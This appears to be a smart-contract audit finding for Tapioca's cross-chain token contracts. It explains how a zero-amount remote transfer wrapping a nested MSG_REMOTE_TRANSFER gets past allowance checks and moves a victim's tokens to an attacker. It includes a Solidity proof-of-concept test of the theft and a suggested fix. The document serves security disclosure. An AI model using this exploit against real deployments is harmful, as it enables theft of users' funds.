Future Azure Locust

high

# Nesting remote transfer messages to steal tokens

## Summary

The user can use a nested `MSG_REMOTE_TRANSFER` message in a valid `MSG_REMOTE_TRANSFER` to execute back the remote transfer as the owner of tokens (stealing their tokens). Additionally, the allowance check can be easily bypassed so the attacker can make an unauthorized cross-transfer of any supported token belonging to any user (victim).

## Vulnerability Detail

Tapioca allows to execute a cross-chain call to make a remote transfer. 

https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/gitmodule/tapioca-periph/contracts/tapiocaOmnichainEngine/TapiocaOmnichainReceiver.sol#L214-L233

It works as following:
1. User sends a `MSG_REMOTE_TRANSFER` message to destination chain with specified amount of tokens and owner of the tokens (e.g. the user themselves).
2. On the destination chain:
    1. Tapioca transfers tokens from the owner (if the user is allowed to send their tokens) to Tapioca.
    2. Tapioca burns the tokens on destination chain.
    3. Tapioca makes a cross-chain call on behalf of the owner to transfer tokens back to the source chain. The details of this call are kept in the `composeMsg` field of `RemoteTransferMsg` struct.

https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/gitmodule/tapioca-periph/contracts/interfaces/periph/ITapiocaOmnichainEngine.sol#L76-L80

The main issue here is that the `_internalRemoteTransferSendPacket` function is called with `remoteTransferMsg_.owner` as the first parameter, which is the `_srcChainSender` parameter. In other words, the executor or the callback call is the owner (not the user who initiated the process). Additionally, the user can arbitrarily specify the contents of the `composeMsg` in the `MSG_REMOTE_TRANSFER` message (step 1). It can have a nested `MSG_REMOTE_TRANSFER` message that would be called by the owner.

What is more, the attacker is able to bypass the allowance check by simply making the outer `MSG_REMOTE_TRANSFER` for zero amount. The allowance check for 0 amount always passes and allows to execute the nested `MSG_REMOTE_TRANSFER`.

**Let's explore the attack scenario:**
1. The attacker sends a `MSG_REMOTE_TRANSFER` message to destination chain with 0 amount of tokens and the victim as the owner of the tokens.
2. On the destination chain:
    1. Tapioca checks the allowance for the attacker by the victim which passes because the amount is 0.
    2. Tapioca transfers 0 tokens from the victim to Tapioca.
    3. Tapioca burns 0 tokens on destination chain.
    4. Tapioca makes a cross-chain call on behalf of the victim to transfer tokens back to the source chain. This is a nested `MSG_REMOTE_TRANSFER` message by the victim with the victim as the owner and the balance of the victim as the amount.
        1. Tapioca checks the allowance for the victim by the victim which passes because `from == sender`.
        2. Tapioca transfers `amount` of tokens from the victim to Tapioca.
        3. Tapioca burns `amount` of tokens.
        4. Tapioca makes a simple cross-chain call on behalf of the victim to transfer tokens back (again, to the destination chain) to the attacker's address (specified by the attacker in `composeMsg`).
3. PROFIT

**See the Proof of Concept:**

```solidity
    function test_remote_malicious_transfer() public {

        // vars
        LZSendParam memory remoteLzSendParam_;
        MessagingFee memory remoteMsgFee_; // Will be used as value for the composed msg

        uint256 maliciousTokenAmount_ = 1.1 ether;
        LZSendParam memory remoteLzSendParam_malicious;
        MessagingFee memory remoteMsgFee_malicious; 
        bytes memory composeMsg_malicious;

        /**
         * Setup
         */

        {
            deal(address(aUsdo), address(userB), maliciousTokenAmount_); // Victim needs tokens on chain A

            // Setup malicious callback
            PrepareLzCallReturn memory prepareLzCallReturn1_ = usdoHelper.prepareLzCall( // B->A data
                IUsdo(address(aUsdo)),
                PrepareLzCallData({
                    dstEid: bEid,
                    recipient: OFTMsgCodec.addressToBytes32(address(userA)),
                    amountToSendLD: maliciousTokenAmount_,
                    minAmountToCreditLD: maliciousTokenAmount_,
                    msgType: SEND,
                    composeMsgData: ComposeMsgData({
                        index: 0,
                        gas: 0,
                        value: 0,
                        data: bytes(""),
                        prevData: bytes(""),
                        prevOptionsData: bytes("")
                    }),
                    lzReceiveGas: 1_000_000,
                    lzReceiveValue: 0
                })
            );
            remoteLzSendParam_ = prepareLzCallReturn1_.lzSendParam;
            remoteMsgFee_ = prepareLzCallReturn1_.msgFee;

            remoteLzSendParam_.fee.nativeFee += 806;
            remoteMsgFee_.nativeFee += 806;
            
            // Setup malicious remote transfer
            RemoteTransferMsg memory remoteTransferData =
                RemoteTransferMsg({composeMsg: bytes(""), owner: address(userB), lzSendParam: remoteLzSendParam_});
            bytes memory remoteTransferMsg_ = usdoHelper.buildRemoteTransferMsg(remoteTransferData);

            PrepareLzCallReturn memory prepareLzCallReturn2_ = usdoHelper.prepareLzCall(
                IUsdo(address(bUsdo)),
                PrepareLzCallData({
                    dstEid: aEid,
                    recipient: OFTMsgCodec.addressToBytes32(userA),
                    amountToSendLD: 0,
                    minAmountToCreditLD: 0,
                    msgType: PT_REMOTE_TRANSFER,
                    composeMsgData: ComposeMsgData({
                        index: 0,
                        gas: 1_000_000,
                        value: uint128(remoteMsgFee_.nativeFee),
                        data: remoteTransferMsg_,
                        prevData: bytes(""),
                        prevOptionsData: bytes("")
                    }),
                    lzReceiveGas: 1_000_000,
                    lzReceiveValue: 0
                })
            );
            
            composeMsg_malicious = prepareLzCallReturn2_.composeMsg;
        }

        {

            // @dev `remoteMsgFee_` is to be airdropped on dst to pay for the `remoteTransfer` operation (B->A).
            PrepareLzCallReturn memory prepareLzCallReturn1_ = usdoHelper.prepareLzCall( // B->A data
                IUsdo(address(bUsdo)),
                PrepareLzCallData({
                    dstEid: aEid,
                    recipient: OFTMsgCodec.addressToBytes32(address(userB)),
                    amountToSendLD: 0,
                    minAmountToCreditLD: 0,
                    msgType: SEND,
                    composeMsgData: ComposeMsgData({
                        index: 0,
                        gas: 0,
                        value: 0,
                        data: bytes(""),
                        prevData: bytes(""),
                        prevOptionsData: bytes("")
                    }),
                    lzReceiveGas: 1_000_000,
                    lzReceiveValue: 0
                })
            );
            remoteLzSendParam_ = prepareLzCallReturn1_.lzSendParam;
            remoteMsgFee_ = prepareLzCallReturn1_.msgFee;

            remoteLzSendParam_.fee.nativeFee += 806;
            remoteMsgFee_.nativeFee += 806;
        }

        /**
         * Actions
         */

        RemoteTransferMsg memory remoteTransferData =
            RemoteTransferMsg({composeMsg: composeMsg_malicious, owner: address(userB), lzSendParam: remoteLzSendParam_});
        bytes memory remoteTransferMsg_ = usdoHelper.buildRemoteTransferMsg(remoteTransferData);

        PrepareLzCallReturn memory prepareLzCallReturn2_ = usdoHelper.prepareLzCall(
            IUsdo(address(aUsdo)),
            PrepareLzCallData({
                dstEid: bEid,
                recipient: OFTMsgCodec.addressToBytes32(userB),
                amountToSendLD: 0,
                minAmountToCreditLD: 0,
                msgType: PT_REMOTE_TRANSFER,
                composeMsgData: ComposeMsgData({
                    index: 0,
                    gas: 1_500_000,
                    value: uint128(remoteMsgFee_.nativeFee),
                    data: remoteTransferMsg_,
                    prevData: bytes(""),
                    prevOptionsData: bytes("")
                }),
                lzReceiveGas: 1_500_000,
                lzReceiveValue: 0
            })
        );
        
        bytes memory composeMsg_ = prepareLzCallReturn2_.composeMsg;
        bytes memory oftMsgOptions_ = prepareLzCallReturn2_.oftMsgOptions;
        MessagingFee memory msgFee_ = prepareLzCallReturn2_.msgFee;
        LZSendParam memory lzSendParam_ = prepareLzCallReturn2_.lzSendParam;


        assertEq(bUsdo.balanceOf(address(userA)), 0);

        vm.deal(userA, msgFee_.nativeFee);
        vm.prank(userA);
        (MessagingReceipt memory msgReceipt_,) = aUsdo.sendPacket{value: msgFee_.nativeFee}(lzSendParam_, composeMsg_);

        {
            verifyPackets(uint32(bEid), address(bUsdo));

            // Initiate approval
            // bUsdo.approve(address(bUsdo), 0); // Needs to be pre approved on B chain to be able to transfer

            __callLzCompose(
                LzOFTComposedData(
                    PT_REMOTE_TRANSFER,
                    msgReceipt_.guid,
                    composeMsg_,
                    bEid,
                    address(bUsdo), // Compose creator (at lzReceive)
                    address(bUsdo), // Compose receiver (at lzCompose)
                    // address(this),
                    userA,
                    oftMsgOptions_
                )
            );
        }

        {
            verifyPackets(uint32(aEid), address(aUsdo));

            __callLzCompose(
                LzOFTComposedData(
                    PT_REMOTE_TRANSFER,
                    0x5ad79811938c8bdd48e3513a72d845d4d5258f47b0baa7be1952ae2c2b2fc427,//hardcoded because it is not returned  (it is called internally and the return value is not bubbled up)
                    composeMsg_malicious,
                    aEid,
                    address(aUsdo), // Compose creator (at lzReceive)
                    address(aUsdo), // Compose receiver (at lzCompose)
                    // address(this),
                    userB,
                    oftMsgOptions_
                )
            );
        }

        // Check arrival
        {
            assertEq(bUsdo.balanceOf(address(userA)), 0);
            verifyPackets(uint32(aEid), address(aUsdo)); // Verify B->A transfer
            assertEq(aUsdo.balanceOf(address(this)), 0);
            verifyPackets(uint32(bEid), address(bUsdo)); // Verify A->B transfer
            assertEq(bUsdo.balanceOf(address(userA)), maliciousTokenAmount_);
            
        }
    }
```

## Impact

HIGH - Theft of any supported token held by any user on any chain.

## Code Snippet

https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/gitmodule/tapioca-periph/contracts/tapiocaOmnichainEngine/TapiocaOmnichainReceiver.sol#L214-L233

## Tool used

Manual Review

## Recommendation

Validate the compose message to not include nested compose messages or build the callback message from scratch as simple LZ transfer message.